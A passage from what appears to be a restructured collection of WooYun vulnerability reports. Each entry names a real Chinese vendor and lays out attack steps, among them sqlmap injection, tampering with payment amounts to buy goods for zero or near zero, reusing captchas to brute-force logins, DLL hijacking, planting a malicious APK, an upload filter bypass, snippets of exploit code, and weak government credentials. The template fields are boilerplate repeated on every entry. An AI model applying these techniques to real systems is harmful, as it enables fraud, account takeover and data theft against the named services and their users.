**POC**: [ufo@UFO /tmp] $ sqlmap -u "https://example.com/[已脱敏]" --batch --threads 10sqlmap/1.0-dev-b7429dc - automatic SQL injection and database takeover toolhttps://example.com/[已脱敏]] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It 

**绕过**: 直接利用

**修复**: 原来的洞不知是否补好，我没短信管理权限，权当补好了吧。不能一个地方出漏子就仅补一个地方，要把同样的漏子都补好才叫补
---

---
### [wooyun-2015-091073] 某旅游网订单任意金额支付
**厂商**: 美途旅游网 | **年份**: 2015 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美途旅游网生产的订单改下代码金额就可以了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2012-08966] TRS内容管理平台用户注册逻辑漏洞
**厂商**: TRS | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先site:gov.cn  inurl:WCMTRS 的内容管理系统是国内政府网站使用最多的系统之一如上面所说：外交部 https://example.com/[已脱敏]  STATUS 值为 30，或增加STATUS字段表单。然后提交注册虽然说是“请等待开通！”，但实际上已经开通了，因为 STATUS 字段让我们改成正常了。直接登陆虽然没什么权限，但后台存在大量注入等漏洞如：可以通过注入直接操作数据库了。http://localhost:9999/wcm/file/read_file.jsp?FileName=U02012062838349

**POC**: 上面说过了。

**绕过**: 直接利用

**修复**: 应该懂，先叫官方出补丁，再修吧！
---

---
### [wooyun-2015-0111093] 安阳某网存在逻辑漏洞可至群站沦陷
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主站，https://example.com/[已脱敏] cms 密码找回漏洞网址：https://example.com/[已脱敏]

**POC**: 菜刀连接反查下ip是个群站，有23个网址解析到该服务器ip，公司的，政府的，邮箱，而且，PR值都有4到5看下数据库：这么多网站数据库，感觉安阳市数据尽收眼底，数据泄露的话可不好了

**绕过**: 直接利用

**修复**: 修改默认用户名：admin密码提示填写
---

---
### [wooyun-2014-064743] 如家某逻辑漏洞可导致任意账户登入（非暴力）
**厂商**: 如家酒店集团 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 会员登陆站点https://example.com/[已脱敏]'x 密码x的时候即可成功登录，多次尝试可进入不同的账户目测有注入，就不继续玩蛋了，洗洗睡觉了，明天还的去搬砖。不少的金卡用户和积分、用户敏感信息（如身份证、手机号码、某邮箱服务等），可精确定位，精确打击。。。https://example.com/[已脱敏]  都被大牛黑了啊 亲 还有你旗下的莫泰那些子站都挂满了。。招个搞安全的好好整整

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 审查下登录验证逻辑。住在如家要让我们放心啊。
---

---
### [wooyun-2015-0111357] Green网络加速器敏感信息泄露+支付逻辑漏洞
**厂商**: greenjsq.mobi | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] -lrtpwdls -lrtcd /var/www/joomlacn/openvpn/Open_UDP/sed -i 's#port 853#port 753#g' *U.ovpncd /var/www/joomlacn/openvpn/rm -rf openvpn.zipzip -r openvpn.zip Open*cd /var/www/joomlacn/openvpn/Open_UDP/sed -i 's#port 853#port 753#g' *U.ovpnls -acd /var/www/joomlacn/openvpn/rm -rf openvpn.zipzip -r openvpn.zip Open*cd /var/www/joomlacn/openvpn/Open_UD

**POC**: rs

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-099110] 新疆广电接口配置不当，可拖库，可代办业务
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 认证接口

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、接口配置不当，遍历接口可直接脱库，应该有上百万此处接口只是为了让用户确认账号信息，但是带出来了太多隐私数据https://example.com/[已脱敏]

**POC**: 1、没什么好证明的，遍历接口跑就是了，什么限制都没。2、登陆的验证码都是可以复用的，用过没做销毁，手动输一次之后就可以自动化了，业务办理走的也是接口，可以批量操作，就不证明了

**绕过**: 直接利用

**修复**: 查询接口只返回用户的部分姓名即可，其他用*号隐藏，不用全部显示，这样就可以避免非本人登陆办理业务姓名电话地址什么的无关信息，不要在此接口出现
---

---
### [wooyun-2015-0125899] MIUIV6 系统存在绕过验证免费用收费主题漏洞
**厂商**: 某手机厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先 我们在MIUI V6系统中选择 设置-其他高级设置-按键-返回键-选择停止当前程序然后我们选择一个主题，可以看到这个主题收费6米币，然后我们点击试用提示正在试用静静的等待5分钟五分钟以后，提示试用时间到直接用刚才设置的返回键结束应用试试效果非常完美（所有内容不针对测试用主题设计师）

**POC**: 试用期过后一段时间仍能完美使用

**绕过**: 直接利用

**修复**: 给予个性主题APP定时检查主题是否授权权限（不要让这个程序自启动，费电），用另外一个小的系统插件来执行
---

---
### [wooyun-2014-082978] php后台验证码绕过暴力破解
**厂商**: php云人才系统 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 最新版登陆请求为:username=admin&password=admin88&authcode=adaa&login_sub=&pytoken=e474ef35609b验证码使用一次没有销毁，可以一直使用导致后台暴力破解。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改验证码的设计逻辑
---

---
### [wooyun-2015-0108107] 某网上商城系统任意订单取消
**厂商**: www.lebi.cn | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、先提交一个订单之后点击取消抓包2、打开抓到的url 提示ok3、来看看我们的订单是不是取消了成功取消了4、下面我换一个号来提交3个订单订单号分别是258 259 260  前面的200多个订单都可以取消测试嘛就自己来ok5、下面我们来打开url试试测试取消都提示ok 我们来我的订单处查看是否取消都成功取消了

**POC**: 1、先提交一个订单之后点击取消抓包2、打开抓到的url 提示ok3、来看看我们的订单是不是取消了成功取消了4、下面我换一个号来提交3个订单订单号分别是258 259 260  前面的200多个订单都可以取消测试嘛就自己来ok5、下面我们来打开url试试测试取消都提示ok 我们来我的订单处查看是否取消都成功取消了

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-036056] 我是如何在迪信通花6毛钱买到红米手机的
**厂商**: dixintong.com | **年份**: 2013 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 功能测试

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这是普通的29块的SD卡修改SD商品的VALUE值,当然底下有个隐藏域,主要的还是隐藏域的VALUE值同理将其他的商品一样改成负值，改成与红米手机差不多的价钱，因为前面是-19.4，后面需要20块的邮费，所以到后面就变成正的6毛然后网银支付，支付成功!商城里的订单.证明是支付完成的,因为是已下订单~

**POC**: 这是普通的29块的SD卡修改SD商品的VALUE值,当然底下有个隐藏域,主要的还是隐藏域的VALUE值同理将其他的商品一样改成负值，改成与红米手机差不多的价钱，因为前面是-19.4，后面需要20块的邮费，所以到后面就变成正的6毛然后网银支付，支付成功!商城里的订单.证明是支付完成的,因为是已下订单~

**绕过**: 直接利用

**修复**: 你们会的~
---

---
### [wooyun-2012-014557] 优购网密码修改问题
**厂商**: 优购网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 优购网首页：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 主要是一种逻辑上的失误，接收验证码的手机怎么能在客户端传上去呢。
---

---
### [wooyun-2013-025962] 某搜索引擎网游存在支付漏洞
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1：大家都玩游仙吗  https://example.com/[已脱敏]

**POC**: 4：用burpsuit拦截：5：将某搜索引擎币参数amount=10000改为1：6：所支付的某搜索引擎币为1元

**绕过**: 直接利用

**修复**: 1.像金额这样的信息不要放在页面上，确实有随时被篡改的风险，这些信息本来就在数据库中，可以定义一个字符型的字段代替金额的传输，或者直接由商品唯一标识来查询数据库得到金额；2.签名校验是最重要的了，将购买的商品、数量、金额（或替代字段）、订单的ID号生成一个校验字符串。在每次数据传输的过程中进行校验，
---

---
### [wooyun-2015-092899] 孵蛋网任意密码重置漏洞逻辑缺陷
**厂商**: 孵蛋网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x01 说明我之前用于测试，注册了两个账号一个叫做admin另一个叫做wooyuners0x02 开始在登录页面点击"找回密码"输入用户名，填写验证码。作为用户凭证验证用户名存在之后，开始验证邮箱之后点击确定按钮开始跳转，应该是发送邮件到邮箱瞬间，发现有"异物"明文的……我擦？赶紧去邮箱看看到底是神马内容邮箱里面的也是明文。https://example.com/[已脱敏] 验证校验只需要邮箱账号跟用户名就行了？于是再注册了个账号，看看直接用账号跟用户名能否找回https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 至少用个加密编码神马的吧？
---

---
### [wooyun-2016-0171274] 酒仙网某处逻辑漏洞导致可登录其他用户账户可泄露用户信息
**厂商**: 酒仙网 | **年份**: 2016 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 认证接口

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录酒仙网，然后点击左上角的请登录，然后选择合作账号某社交平台登录，在登录界面时候点取消，然后自动跳转到酒仙网首页，竟然页面自动登录任意一位的用户账号，目测账号余额很多。。。泄露过程如图：

**POC**: 泄露过程如图：

**绕过**: 直接利用

**修复**: 某社交平台合作登录调整机制
---

---
### [wooyun-2015-0148098] mob移动开发者服务平某处支付逻辑漏洞
**厂商**: mob.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 提交订单号 订单号和金额分开https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 开发者肯定有办法的
---

---
### [wooyun-2014-083688] php设计缺陷导致绕过open_basedir列举目录之3
**厂商**: PHP | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: @/fd的代码里对于列目录有两个方法，一是利用DirectoryIterator类，二是利用realpath函数。前者很好用，我就不多说了。单说下后者，realpath函数在处理已存在的文件（目录）与不存在的文件（目录）时情况不同，如果文件已存在则会抛出错误:open_basedir restriction in effect. File(xxxxx) is not within the allowed path(s)，如果文件不存在则会返回false。所以我们可以通过捕捉错误handle，来判断某文件是否存在。我的第三个方法也类似。php的gd2库有一个函数叫imageftbbox：GD库基本上是php必备库，所以也不存在鸡肋不鸡肋的说法。这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not 

**POC**: 在windows下，我们可以通过windows特性，也就是“通配符”来快速枚举目录，不需要暴力跑目录了。详细代码见#1，这里情况有些不同，所以我再说一遍。例如d:/test/下有如下文件：我写了个简单的，但只能枚举文件第一个字符的代码：<?phpprintf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));set_error_handler('isexists');$dir = 'd:/test/';$file = '';$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';for 

**绕过**: 直接利用

**修复**: 只要在open_basedir外，不管文件是否存在，都应该抛出相同错误。
---

---
### [wooyun-2014-080771] 某运营商实名认证平台严重缺陷(可导致海量身份证信息泄露)
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某天本屌逛某电商平台买个流量卡,怎奈本屌是穷屌 所以看来看去看到某张卡的介绍详情里包括了 如下信息实名网址：https://example.com/[已脱敏] 密码：123456好了正题.0x1首先映入眼帘的是帐号登录系统. 这里的逻辑是首先验证用户名是否存在与系统如果存在继续输入密码0x2下一步会把该管理员的所有信息输出出来. 当然包括没加盐的MD5(PWD)```` 都没想到现在还有这么写的..```再一次, 此处验证码形同虚设.联通的管理员帐号是系统生成的所以都是一个挨着一个的, 所以根据图二的POST,我用脚写了一段code,跑了几个小时抓到了2W6多个管理员信息.输出password`没加盐的md5实在太好破了!据完全统计 96%的管理员密码都成功配对.(不要抓我`` 马山就删)我随便登录一个好伐`` 用户数据我没敢跑.1500多条用户身份证信息看到这

**POC**: 上面``

**绕过**: 直接利用

**修复**: 我啥也不会``
---

---
### [wooyun-2014-049580] 快的打车短信轰炸加电话轰炸
**厂商**: 快的打车 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在这里https://example.com/[已脱敏]

**POC**: 问题出在这里https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 这验证是没有做好验证吧
---

---
### [wooyun-2015-0138279] 校信学习网支付漏洞-1元购买e校信智能手表
**厂商**: 橘子网络科技 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在公司首页发现了一个e校信学习网，点开链接去观察了一下来到手表购买页面http://**.**.**.**/shop，选择黑色手表购买在订单页面上填写信息后提交，将oderprice改为1提交订单成功，并可以支付，俺是遵纪守法的白帽子，没有真实支付。

**POC**: 同上

**绕过**: 直接利用

**修复**: 增加验证功能==
---

---
### [wooyun-2015-0141916] 一米鲜某处严重逻辑漏洞可导致0元购买所有商品（已成功下单并获得自提码）
**厂商**: 1mxian.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出现在在APP端的 一米鲜首先 我们选取水果 然后加入购物车 点击选好了这个时候抓包把第一个的数量改为-1然后到支付的页面我们发现 金额已经变为0了我们来支付下下单成功来订单里面看一下成功给我了取货码 我可以去自提了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对数量进行个判断，不能为负数
---

---
### [wooyun-2015-0123051] p2p金融安全之前海理想金融多处严重逻辑漏洞(影响用户账号安全)
**厂商**: id68.cn | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞描述：1问题出现在获取的手机动态验证码，没有做判断，缺乏校验，并且可以重复利用2登录功能处，验证码在登录请求后没有刷新。可重复使用漏洞危害：可以使用任意手机号注册。影响用户安全登录功能可撞库也可爆破指定账号

**POC**: 0x01首先正常注册流程 ，输入手机号，验证码，然后手机会收到动态验证码这时我们记下动态验证码，然后打开另一个浏览器，输入我们想要注册的手机号，这里以13888888888(土豪手机号)测试。这里我们直接使用上一步我们获取的验证码，然后输入密码，点击注册，提示注册成功然后登录成功继续注册上面的注册流程，还是使用相同的验证码，再次注册成功，0x02正常登录流程，输入手机号，错误的密码，验证码,可以看到验证码没有刷新加入到工具里面 ，很容易爆破一些弱密码的用户这里我们以官网上一个手机号  13632690186 为例我们测试  13632691000 －－ 13632699999 号码段，密码为1

**绕过**: 直接利用

**修复**: 手机动态验证码逻辑要好好改改验证码在每次请求后，需要刷新，重新生成的
---

---
### [wooyun-2013-039290] 傲游浏览器限制不严格可导致网页欺诈攻击
**厂商**: 傲游 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: BrowserProvider导出且没有权限限制，可以通过此修改其中的书签栏等等，可以增加一些钓鱼网站伪造等等情况。利用代码:private void testprovider(){int i = 0;ContentResolver contentres = getContentResolver();Uri uri = Uri.parse("content://com.mx.browser.browserprovider/bookmark");Cursor cursor = contentres.query(uri, null, null, null, null);do{i++;Log.i("Test", (new StringBuilder("personid=")).append(cursor.getInt(0)).append(",name=").append(cursor.getS

**POC**: 运行后，会自动在书签栏增加你所要的url

**绕过**: 直接利用

**修复**: 对BrowserProvider的操作做下限制
---

---
### [wooyun-2015-0158019] 某省地方海事局系统设计逻辑缺陷导致敏感信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://**.**.**.**/两个弱口令：wangling@**.**.**.** 123456wangxin@**.**.**.** 123456

**POC**: 成功登录，可改密码：不深入了

**绕过**: 直接利用

**修复**: 改密码
---

---
### [wooyun-2015-0114433] 傲游浏览器设计不当可导致用户保存密码被窃取
**厂商**: 傲游 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 思路来源：WooYun: 某浏览器等设计不当可导致用户密码被窃取危害1: 有些网站例如 sinaapp.com ，它的子域名都是由不同开发者开发的，如果有一个开发者恶意在页面中嵌入许多其他该域名下的隐藏登录表单，而用户又保存了该网站的密码，则该密码会自动填写进去。危害2：只要某域名有某个子站沦陷，攻击者无需利用COOKIE等就可以直接获得保存密码表单的用户的密码。这里为了方便演示，我直接就借用作者的网站了，也懒得构造代码了。

**POC**: 1.访问360tc.sinaapp.com， 填写用户名密码，点登录并保存。2.访问360chi.sinaapp.com， 点按钮，便会显示隐藏表单中的密码。可以看到不同的二级域名，却把用户密码完整的读取出来了。

**绕过**: 直接利用

**修复**: 完全匹配域名，完全一致的域名的情况下再给用户匹配密码。
---

---
### [wooyun-2010-0791] 人人桌面挂马漏洞
**厂商**: 人人网 | **年份**: 2010 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在人人中发布一篇日志，期中含有html代码，在人人桌面中就会一网页方式解析这些代码，这样如果发布一个带有挂马代码或者其他恶意代码的日志，就会对通过人人桌面程序阅读或者回复这篇日志的用户完成一次攻击。

**POC**: 先在人人中发布一篇日志内容为:<html><head><title>test</title></head><body><iframe src="http:\\www.baidu.com" weight="200" height="500"></iframe></body></html>发布后我们可以看到，在人人网页中文字没有问题（图1），而在我的好友的人人桌面中打开这篇日志（图2），可以看到代码被成功解析了，把某搜索引擎的地址换成网页木马的地址，当好友用人人桌面访问时一次挂马攻击就完成了。图1图2

**绕过**: 直接利用

**修复**: 在人人桌面对用户发表的日志中的代码进行转意
---

---
### [wooyun-2012-09177] 人人网Android客户端可能导致劫持或恶意软件安装
**厂商**: 人人网 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 人人网最新版Android客户端使用了私信功能，私信采用单独的Android软件实现，在首次启用时，联网下载该软件客户端，并存储在SD卡固定目录，然后安装并使用。如果该目录已经存在这个文件，则直接安装，而不验证这个文件是否完整无误。具体而言，该目录地址为/sdcard/Renren/downloads/Sixin.apk。另一方面，在Android中，SD卡是任何应用软件可以随意读写的。因此，攻击者只需要先将恶意软件写入/sdcard/Renren/downloads/目录并命名为Sixin.apk，在人人网客户端中启用私信，这个恶意软件就会直接被安装。特别的，攻击者可以投放一个篡改后的Sixin.apk（用repackaging技术），可以用于劫持用户会话或回传用户数据等。

**POC**: 不写利用代码了。直接说利用步骤吧：1. 确定手机上还没装人人私信软件2. 随便搞个apk文件，放到/sdcard/Renren/downloads/目录并命名为Sixin.apk3. 进入人人网客户端，点击私信功能这样就可以看到这个apk软件被安装了。

**绕过**: 直接利用

**修复**: 两种方法：1. 把Sixin.apk的缓存地址改为人人客户端的私有目录，而不是SD卡这样的所有软件都可读写的目录；2. 对Sixin.apk的完整性做验证后再安装。
---

---
### [wooyun-2013-036717] 9158视频客户端DLL劫持
**厂商**: 天格科技（杭州） | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 9158多人视频客户端默认安装路径：C:\Program Files\9158KTV\具体利用方法：9158.exe运行时会加载一个不存在的DLL文件ieframe.dll，只要自己写一个ieframe.dll与9158.exe放在同一目录，这样就可以在运行9158.exe的时候会同时加载ieframe.dll，这个ieframe.dll可以为自制的任意恶意dll。此方法可用于劫持启动木马病毒。（我这里放入特定的dll后，运行9158.exe会弹出一个特定的框显示"Hello from MyDLL!"，如下图）

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2014-073185] 深圳航空出现支付漏洞，0元购机票
**厂商**: 深圳航空 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 深圳航空手机客户端，对机票价格验证不严，下单订单的时候抓包，可以任意篡改订单价格，0元购机票以下是2014-08-21，07:30起飞的深圳到北京的ZH9959，头等舱的订单，抓包后的数据，可以看到 含税的价格是4530<xsd:anyType xsi:type="xsd:string">;DC;iphoneClient;false;true;4530;0</xsd:anyType><xsd:anyType xsi:type="xsd:string">SZX,PEK,2014-08-21,07:30,ZH9959,4360,F,249,50,120,2630,F,150,0,60,0,0,0,0,0,&#x6DF1;&#x5733;,&#x5317;&#x4EAC;,RE2014080652828,1,&#x65E0;,false,AD3ABC2A-EB45-468D-AE37-93498

**POC**: 下图是正常机票的价格下图为修改价格后的订单价格

**绕过**: 直接利用

**修复**: 对价格进行校验
---

---
### [wooyun-2013-035453] 风行播放器DLL劫持漏洞
**厂商**: 北京风行在线技术有限公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 风行Funshion（版本2,8,6,51），安装程序为官网FunshionInstall2.8.6.51.exe，windows xp sp3环境，Funshion.exe运行时会试图加载一个不带路径的nvcuvid.dll文件，如果在音视频文件目录下放置一个恶意的nvcuvid.dll文件，当用户双击打开该音视频文件时，恶意DLL即被加载触发，危害性不用说了吧。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 全路径加载。
---

---
### [wooyun-2016-0188155] 艺龙旅行网严重支付漏洞（只需知道银行信用卡号即可消费）
**厂商**: 艺龙旅行网 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先，在艺龙随便下了一个订单，到支付页面，选择信用卡支付输入正确的卡号，有效期姓名，身份证等相关信息随便输居然支付成功了。那么问题来了说明这里只判断信用卡有效期即可成功支付接下来就简单了，我们只要尝试爆破出信用卡的有效期即可然后发现错误的有效期也能使订单到判定支付是否成功的阶段

**POC**: 所以。下多个订单随便点击一个订单到支付页面抓包POST /epay/isajax/CreditCardExtend/Save HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: https://example.com/[已脱敏] application/json, text/javascript, */*Content-Type: application/x-www-form-urlencoded

**绕过**: 直接利用

**修复**: 信用卡支付逻辑是不是该有有效期+CVV码+手机验证码组成？
---

---
### [wooyun-2015-095349] 海澜之家逻辑缺陷导致用户信息泄露
**厂商**: heilanhome.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 老样子 生成订单时没有验证addressid在确认订单时候抓包修改addressid参数 然后提交订单 查看订单

**POC**: 有些id是空的 提交后收货人什么的会空白

**绕过**: 直接利用

**修复**: 验证addressid
---

---
### [wooyun-2013-045315] 安全狗上传过滤绕过
**厂商**: 安全狗 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 20131208最新版的安全狗套装(iis+服务器)这是传说中的下标越界么？无视后缀检测，无视内容检测(不过想成功访问 还是要搞个不被过滤的内容 这个就简单了 大家都懂 安全狗你也懂对不对)随便找了一套程序做测试，这里测试的程序保存文件是依据POST地址中的xxx.xxx文件名做存储的,直接无视掉了安全狗，毕竟这里你没办法过滤吧?，这种程序在N年前的编辑器中非常常见。POST /EESaiUp.asp?0|0|0|/EESaiUp/|0|AsaiUp|up1|0|0|0|C:\Documents%20and%20Settings\Administrator\one.asp HTTP/1.0不过安全狗会对表单提交数据进行判断拦截，所以呢我们还是主要关注这块，毕竟大多数程序都不会那么2，我找了几个测试站点，基本上都是不限制后缀上传但装了安全狗，或就算限制了后缀也可以%00绕过的那种。所以我们只

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 呵呵，你懂的。
---

---
### [wooyun-2014-059130] 一个exe让某搜索引擎杀毒所有防护功能失效(再现灰鸽子)
**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

